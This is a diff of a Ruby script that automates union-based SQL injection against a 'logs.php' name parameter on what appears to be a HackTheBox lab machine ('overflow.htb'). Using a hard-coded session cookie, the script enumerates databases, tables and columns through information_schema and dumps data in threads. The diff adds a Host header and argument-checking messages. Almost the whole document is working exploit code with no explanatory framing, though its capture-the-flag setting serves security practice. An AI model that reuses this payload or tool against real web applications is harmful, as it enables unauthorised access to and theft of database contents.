@@ -8,20 +8,20 @@ require 'net/http'
 options = {}
 
 OptionParser.new do |opt|
-  opt.on('--get-dbs') { |_o| options[:get_dbs] = true }
+  opt.on('--get-dbs') { options[:get_dbs] = true }
   opt.on('--db DATABASE_NAME') { |o| options[:db_name] = o }
-  opt.on('--get-tables') { |_o| options[:get_tables] = true }
+  opt.on('--get-tables') { options[:get_tables] = true }
   opt.on('--table TABLE_NAME') { |o| options[:table_name] = o }
-  opt.on('--get-columns') { |_o| options[:get_columns] = true }
+  opt.on('--get-columns') { options[:get_columns] = true }
   opt.on('--columns COLUMN_1[,COLUMN_2,...]') { |o| options[:columns] = o }
 end.parse!
 
 def do_sqli(query)
   payload = "') union select 1,1,(#{query}) union select 1,1,('1"
-  url = URI("http://overflow.htb/home/logs.php?name=#{payload}")
+  url = URI("http://10.10.11.119/home/logs.php?name=#{payload}")
 
   cookie = 'auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'
-  res = Net::HTTP.get(url, { Cookie: cookie })
+  res = Net::HTTP.get(url, { Cookie: cookie, Host: 'overflow.htb' })
 
   return '' if res.empty?
 
@@ -40,6 +40,11 @@ def do_sqli_threads(query, number)
   res
 end
 
+if options.empty?
+  puts 'ERROR: Use --help'
+  exit
+end
+
 if options[:get_dbs]
   n = do_sqli('select count(*) from information_schema.schemata').to_i
   puts "[*] Number of databases: #{n}.\n\n"
@@ -47,6 +52,11 @@ if options[:get_dbs]
   query = 'select schema_name from information_schema.schemata'
 
   puts do_sqli_threads(query, n)
+  exit
+end
+
+if !options[:db_name].empty? && !options[:get_tables] && !options[:table_name]
+  puts 'ERROR: Use --get-tables'
   exit
 end
 
@@ -59,6 +69,11 @@ if !options[:db_name].empty? && options[:get_tables]
   query = "select table_name from information_schema.tables where table_schema = '#{db_name}'"
 
   puts do_sqli_threads(query, n)
+  exit
+end
+
+if !options[:db_name].empty? && !options[:table_name].empty? && !options[:get_columns] && !options[:columns]
+  puts 'ERROR: Use --get-columns'
   exit
 end
 
